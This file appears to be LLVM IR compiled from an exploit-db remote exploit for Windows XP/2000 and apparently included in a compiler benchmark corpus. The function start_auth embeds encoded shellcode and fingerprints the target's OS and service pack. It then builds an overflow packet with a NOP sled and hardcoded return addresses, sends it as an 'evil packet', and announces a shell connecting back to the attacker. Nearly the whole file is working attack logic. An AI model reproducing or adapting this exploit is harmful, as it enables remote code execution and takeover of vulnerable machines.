; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_23437.c_start_auth.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_23437.c_start_auth.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@SIZEOF = common dso_local global i32 0, align 4
@__const.start_auth.shellc0de = private unnamed_addr constant [463 x i8] c"\EB\02\EB\0Ff\81\EC\04\08\8B\EC\83\ECP\E8\EF\FF\FF\FF[\80\C3\103\C9f\B9\BA\01\803\95C\E2\FA~\FA\A6N&\A5\F1\1E\96\1E\D5\99\1E\DD\99\1ET\1E\C9\B1\9D\1E\E5\A5\96\E1\B1\91\AD\8B\E0\DD\1E\D5\8D\1E\CD\A9\96M\1E\CE\ED\96M\1E\E6\89\96e\C3\1E\E6\B1\96e\C3\1E\C6\B5\96E\1E\CE\8D\DE\1E\A1\0F\96e\96\E1\B1\81\1E\A3\AE\E1\B1\8D\E1\93\DE\B6N\E0\7FV\CA\A6\\\F3\1E\99\CA\CA\1E\A9\1A\18\91\92V\1E\8D\1EV\AET\E04V\16y\D5\1Ey\14y\B5\97\95\95\FD\EC\D0\ED\D4\FF\9F\FF\DE\FF\95}\E3jjj\A6\\R\D0i\E2\E6\A7\CA\F3R\D0\95\A6\A7\1D\D8\97\1EH\F3\16~\91\C4\C4\C6jE\1C\D0\91\FD\E7\F0\E6\E6\FF\9F\FF\DE\FF\95}\D3jjj\1E\C8\91\1C\C8\12\1C\D0\02R\D0i\C2\C6\D4\C6R\D0\95\FA\F6\FE\F0R\D0\91\E1\D4\95\95\1EX\F3\16|\91\C4\C6jE\A6N\C6\C6\C6\C6\FF\94\FF\97jE\1C\D01R\D0i\F6\FA\FB\FBR\D0\95\F0\F6\E1\95\1EX\F3\16|\91\C4j\E0\12j\C0\02\A6N&\97\1E@\F3\1C\8F\96F\F3R\97\97\0F\96FR\97U=\94\94\FF\85\C0j\E01jE\FD\F0\E6\E6\D4\FF\9F\FF\DE\FF\95}Qkjj\A6NR\D09\D1\95\95\95\1C\C8%\1C\C8-\1C\C8!\1C\C8)\1C\C8U\1C\C8Q\1C\C8]R\D0M\94\94\95\95\1C\C8I\1C\C8u\1E\D81\1C\D8q\1C\D8}\1C\D8y\18\D8e\C4\18\D89\C4\C6\C6\C6\FF\94\C6\C6\F3R\D0i\F6\F8\F3R\D0k\F1\95\1D\C8j\18\C0i\C7\C6jE\FD\ED\FC\E1\C1\FF\94\FF\DE\FF\95}\CDkjjj\00", align 16
@.str = private unnamed_addr constant [29 x i8] c"error: wrong data received\0D\0A\00", align 1
@.str.1 = private unnamed_addr constant [28 x i8] c"[+] Gathering %-30s     ...\00", align 1
@.str.2 = private unnamed_addr constant [12 x i8] c"information\00", align 1
@.str.3 = private unnamed_addr constant [7 x i8] c"Done\0D\0A\00", align 1
@.str.4 = private unnamed_addr constant [24 x i8] c"[i] Operating system : \00", align 1
@.str.5 = private unnamed_addr constant [6 x i8] c"WinXP\00", align 1
@.str.6 = private unnamed_addr constant [8 x i8] c"Win2000\00", align 1
@.str.7 = private unnamed_addr constant [30 x i8] c"\0D\0A[i] Service Pack     : %s\0D\0A\00", align 1
@.str.8 = private unnamed_addr constant [2 x i8] c"0\00", align 1
@.str.9 = private unnamed_addr constant [43 x i8] c"[+] Setting shellc0de for this %-15s   ...\00", align 1
@.str.10 = private unnamed_addr constant [8 x i8] c"version\00", align 1
@WINUSER = common dso_local global i32 0, align 4
@RET_WIN2k = common dso_local global i8* null, align 8
@.str.11 = private unnamed_addr constant [35 x i8] c"[!] Using 0x7736d507 as ret addr\0D\0A\00", align 1
@RET_XP_VAR0 = common dso_local global i8* null, align 8
@RET_XP_VAR1 = common dso_local global i8* null, align 8
@.str.12 = private unnamed_addr constant [35 x i8] c"[!] Using 0x77351cc1 as ret addr\0D\0A\00", align 1
@RET_XP_VAR2 = common dso_local global i8* null, align 8
@.str.13 = private unnamed_addr constant [35 x i8] c"[!] Using 0x77391cc1 as ret addr\0D\0A\00", align 1
@WINHOST = common dso_local global i32 0, align 4
@USERPROFILE_NAME = common dso_local global i32 0, align 4
@USERPROFILE_COMPANY = common dso_local global i32 0, align 4
@USERPROFILE_LICENSE = common dso_local global i32 0, align 4
@USERPROFILE_DATE = common dso_local global i32 0, align 4
@INTERFACE_IP = common dso_local global i32 0, align 4
@WINDOMAIN = common dso_local global i32 0, align 4
@CLIENT_VERSION = common dso_local global i32 0, align 4
@.str.14 = private unnamed_addr constant [28 x i8] c"[+] Sending evil %-30s  ...\00", align 1
@.str.15 = private unnamed_addr constant [7 x i8] c"packet\00", align 1
@.str.16 = private unnamed_addr constant [10 x i8] c"Patched\0D\0A\00", align 1
@.str.17 = private unnamed_addr constant [39 x i8] c"[i] Shell should be arrived at %s:%d\0D\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @start_auth(i32 %0, i8* %1, i32 %2, i32 %3) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8*, align 8
  %14 = alloca i64, align 8
  %15 = alloca [463 x i8], align 16
  %16 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i8* %1, i8** %7, align 8
  store i32 %2, i32* %8, align 4
  store i32 %3, i32* %9, align 4
  store i32 4, i32* %11, align 4
  %17 = load i32, i32* @SIZEOF, align 4
  %18 = zext i32 %17 to i64
  %19 = call i8* @llvm.stacksave()
  store i8* %19, i8** %13, align 8
  %20 = alloca i8, i64 %18, align 16
  store i64 %18, i64* %14, align 8
  %21 = bitcast [463 x i8]* %15 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %21, i8* align 16 getelementptr inbounds ([463 x i8], [463 x i8]* @__const.start_auth.shellc0de, i32 0, i32 0), i64 463, i1 false)
  %22 = load i32, i32* %6, align 4
  %23 = load i32, i32* @SIZEOF, align 4
  %24 = call i32 @recv(i32 %22, i8* %20, i32 %23, i32 0)
  store i32 %24, i32* %10, align 4
  %25 = getelementptr inbounds i8, i8* %20, i64 0
  %26 = load i8, i8* %25, align 16
  %27 = sext i8 %26 to i32
  %28 = icmp ne i32 %27, 48
  br i1 %28, label %34, label %29

29:                                               ; preds = %4
  %30 = getelementptr inbounds i8, i8* %20, i64 1
  %31 = load i8, i8* %30, align 1
  %32 = sext i8 %31 to i32
  %33 = icmp ne i32 %32, 17
  br i1 %33, label %34, label %36

34:                                               ; preds = %29, %4
  %35 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str, i64 0, i64 0))
  store i32 -1, i32* %5, align 4
  store i32 1, i32* %16, align 4
  br label %197

36:                                               ; preds = %29
  %37 = getelementptr inbounds i8, i8* %20, i64 28
  store i8 0, i8* %37, align 4
  %38 = getelementptr inbounds i8, i8* %20, i64 36
  store i8 1, i8* %38, align 4
  %39 = load i32, i32* %6, align 4
  %40 = load i32, i32* %10, align 4
  %41 = call i32 @send(i32 %39, i8* %20, i32 %40, i32 0)
  %42 = load i32, i32* @SIZEOF, align 4
  %43 = call i32 @memset(i8* %20, i32 0, i32 %42)
  %44 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.1, i64 0, i64 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.2, i64 0, i64 0))
  store i32 0, i32* %10, align 4
  br label %45

45:                                               ; preds = %49, %36
  %46 = load i32, i32* %10, align 4
  %47 = icmp slt i32 %46, 4096
  br i1 %47, label %48, label %58

48:                                               ; preds = %45
  br label %49

49:                                               ; preds = %48
  %50 = load i32, i32* %6, align 4
  %51 = load i32, i32* %10, align 4
  %52 = sext i32 %51 to i64
  %53 = getelementptr inbounds i8, i8* %20, i64 %52
  %54 = load i32, i32* @SIZEOF, align 4
  %55 = call i32 @recv(i32 %50, i8* %53, i32 %54, i32 0)
  %56 = load i32, i32* %10, align 4
  %57 = add nsw i32 %56, %55
  store i32 %57, i32* %10, align 4
  br label %45

58:                                               ; preds = %45
  %59 = getelementptr inbounds i8, i8* %20, i64 0
  %60 = load i8, i8* %59, align 16
  %61 = sext i8 %60 to i32
  %62 = icmp ne i32 %61, 16
  br i1 %62, label %68, label %63

63:                                               ; preds = %58
  %64 = getelementptr inbounds i8, i8* %20, i64 1
  %65 = load i8, i8* %64, align 1
  %66 = sext i8 %65 to i32
  %67 = icmp ne i32 %66, 39
  br i1 %67, label %68, label %70

68:                                               ; preds = %63, %58
  %69 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str, i64 0, i64 0))
  store i32 -1, i32* %5, align 4
  store i32 1, i32* %16, align 4
  br label %197

70:                                               ; preds = %63
  %71 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.3, i64 0, i64 0))
  %72 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.4, i64 0, i64 0))
  %73 = getelementptr inbounds i8, i8* %20, i64 16
  %74 = load i8, i8* %73, align 16
  %75 = sext i8 %74 to i32
  %76 = icmp eq i32 %75, 40
  br i1 %76, label %82, label %77

77:                                               ; preds = %70
  %78 = getelementptr inbounds i8, i8* %20, i64 17
  %79 = load i8, i8* %78, align 1
  %80 = sext i8 %79 to i32
  %81 = icmp eq i32 %80, 10
  br i1 %81, label %82, label %84

82:                                               ; preds = %77, %70
  store i32 1, i32* %12, align 4
  %83 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.5, i64 0, i64 0))
  br label %86

84:                                               ; preds = %77
  %85 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.6, i64 0, i64 0))
  store i32 0, i32* %12, align 4
  br label %86

86:                                               ; preds = %84, %82
  %87 = getelementptr inbounds i8, i8* %20, i64 37
  %88 = load i8, i8* %87, align 1
  %89 = icmp ne i8 %88, 0
  br i1 %89, label %91, label %90

90:                                               ; preds = %86
  br label %93

91:                                               ; preds = %86
  %92 = getelementptr inbounds i8, i8* %20, i64 37
  br label %93

93:                                               ; preds = %91, %90
  %94 = phi i8* [ getelementptr inbounds ([2 x i8], [2 x i8]* @.str.8, i64 0, i64 0), %90 ], [ %92, %91 ]
  %95 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.7, i64 0, i64 0), i8* %94)
  %96 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.9, i64 0, i64 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.10, i64 0, i64 0))
  %97 = load i32, i32* %12, align 4
  %98 = load i8*, i8** %7, align 8
  %99 = load i32, i32* %8, align 4
  %100 = getelementptr inbounds [463 x i8], [463 x i8]* %15, i64 0, i64 0
  %101 = call i32 @set_sc(i32 %97, i8* %98, i32 %99, i8* %100)
  %102 = getelementptr inbounds i8, i8* %20, i64 2
  %103 = load i32, i32* @SIZEOF, align 4
  %104 = sub nsw i32 %103, 2
  %105 = call i32 @memset(i8* %102, i32 0, i32 %104)
  %106 = getelementptr inbounds i8, i8* %20, i64 175
  %107 = load i32, i32* @WINUSER, align 4
  %108 = call i32 @strcpy(i8* %106, i32 %107)
  %109 = getelementptr inbounds i8, i8* %20, i64 416
  %110 = call i32 @memset(i8* %109, i32 144, i32 180)
  %111 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.3, i64 0, i64 0))
  %112 = load i32, i32* %12, align 4
  %113 = icmp eq i32 %112, 0
  br i1 %113, label %114, label %118

114:                                              ; preds = %93
  %115 = getelementptr inbounds i8, i8* %20, i64 516
  %116 = load i8*, i8** @RET_WIN2k, align 8
  %117 = call i32 @memcpy(i8* %115, i8* %116, i32 4)
  br label %141

118:                                              ; preds = %93
  %119 = load i32, i32* %9, align 4
  %120 = icmp eq i32 %119, 0
  br i1 %120, label %121, label %126

121:                                              ; preds = %118
  %122 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.11, i64 0, i64 0))
  %123 = getelementptr inbounds i8, i8* %20, i64 516
  %124 = load i8*, i8** @RET_XP_VAR0, align 8
  %125 = call i32 @memcpy(i8* %123, i8* %124, i32 4)
  br label %140

126:                                              ; preds = %118
  %127 = load i32, i32* %9, align 4
  %128 = icmp eq i32 %127, 1
  br i1 %128, label %129, label %134

129:                                              ; preds = %126
  %130 = getelementptr inbounds i8, i8* %20, i64 516
  %131 = load i8*, i8** @RET_XP_VAR1, align 8
  %132 = call i32 @memcpy(i8* %130, i8* %131, i32 4)
  %133 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.12, i64 0, i64 0))
  br label %139

134:                                              ; preds = %126
  %135 = getelementptr inbounds i8, i8* %20, i64 516
  %136 = load i8*, i8** @RET_XP_VAR2, align 8
  %137 = call i32 @memcpy(i8* %135, i8* %136, i32 4)
  %138 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.13, i64 0, i64 0))
  br label %139

139:                                              ; preds = %134, %129
  br label %140

140:                                              ; preds = %139, %121
  br label %141

141:                                              ; preds = %140, %114
  %142 = getelementptr inbounds i8, i8* %20, i64 520
  %143 = getelementptr inbounds [463 x i8], [463 x i8]* %15, i64 0, i64 0
  %144 = call i32 @memcpy(i8* %142, i8* %143, i32 463)
  %145 = getelementptr inbounds i8, i8* %20, i64 1200
  %146 = load i32, i32* @WINHOST, align 4
  %147 = call i32 @strcpy(i8* %145, i32 %146)
  %148 = getelementptr inbounds i8, i8* %20, i64 975
  %149 = load i32, i32* @USERPROFILE_NAME, align 4
  %150 = call i32 @strcpy(i8* %148, i32 %149)
  %151 = getelementptr inbounds i8, i8* %20, i64 1295
  %152 = load i32, i32* @USERPROFILE_COMPANY, align 4
  %153 = call i32 @strcpy(i8* %151, i32 %152)
  %154 = getelementptr inbounds i8, i8* %20, i64 1495
  %155 = load i32, i32* @USERPROFILE_LICENSE, align 4
  %156 = call i32 @strcpy(i8* %154, i32 %155)
  %157 = getelementptr inbounds i8, i8* %20, i64 1755
  %158 = load i32, i32* @USERPROFILE_DATE, align 4
  %159 = call i32 @strcpy(i8* %157, i32 %158)
  %160 = getelementptr inbounds i8, i8* %20, i64 2015
  %161 = load i32, i32* @WINHOST, align 4
  %162 = call i32 @strcpy(i8* %160, i32 %161)
  %163 = getelementptr inbounds i8, i8* %20, i64 2275
  %164 = load i32, i32* @INTERFACE_IP, align 4
  %165 = call i32 @strcpy(i8* %163, i32 %164)
  %166 = getelementptr inbounds i8, i8* %20, i64 2535
  %167 = load i32, i32* @WINDOMAIN, align 4
  %168 = call i32 @strcpy(i8* %166, i32 %167)
  %169 = getelementptr inbounds i8, i8* %20, i64 2795
  %170 = load i32, i32* @CLIENT_VERSION, align 4
  %171 = call i32 @strcpy(i8* %169, i32 %170)
  %172 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.14, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.15, i64 0, i64 0))
  %173 = load i32, i32* %6, align 4
  %174 = load i32, i32* @SIZEOF, align 4
  %175 = call i32 @send(i32 %173, i8* %20, i32 %174, i32 0)
  %176 = load i32, i32* @SIZEOF, align 4
  %177 = call i32 @memset(i8* %20, i32 0, i32 %176)
  %178 = load i32, i32* %6, align 4
  %179 = load i32, i32* @SIZEOF, align 4
  %180 = call i32 @recv(i32 %178, i8* %20, i32 %179, i32 0)
  store i32 %180, i32* %10, align 4
  %181 = getelementptr inbounds i8, i8* %20, i64 0
  %182 = load i8, i8* %181, align 16
  %183 = sext i8 %182 to i32
  %184 = icmp ne i32 %183, 50
  br i1 %184, label %190, label %185

185:                                              ; preds = %141
  %186 = getelementptr inbounds i8, i8* %20, i64 1
  %187 = load i8, i8* %186, align 1
  %188 = sext i8 %187 to i32
  %189 = icmp ne i32 %188, 17
  br i1 %189, label %190, label %192

190:                                              ; preds = %185, %141
  %191 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.16, i64 0, i64 0))
  store i32 -1, i32* %5, align 4
  store i32 1, i32* %16, align 4
  br label %197

192:                                              ; preds = %185
  %193 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.3, i64 0, i64 0))
  %194 = load i8*, i8** %7, align 8
  %195 = load i32, i32* %8, align 4
  %196 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.17, i64 0, i64 0), i8* %194, i32 %195)
  store i32 0, i32* %5, align 4
  store i32 1, i32* %16, align 4
  br label %197

197:                                              ; preds = %192, %190, %68, %34
  %198 = load i8*, i8** %13, align 8
  call void @llvm.stackrestore(i8* %198)
  %199 = load i32, i32* %5, align 4
  ret i32 %199
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #2

declare dso_local i32 @recv(i32, i8*, i32, i32) #3

declare dso_local i32 @printf(i8*, ...) #3

declare dso_local i32 @send(i32, i8*, i32, i32) #3

declare dso_local i32 @memset(i8*, i32, i32) #3

declare dso_local i32 @set_sc(i32, i8*, i32, i8*) #3

declare dso_local i32 @strcpy(i8*, i32) #3

declare dso_local i32 @memcpy(i8*, i8*, i32) #3

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { argmemonly nounwind willreturn }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
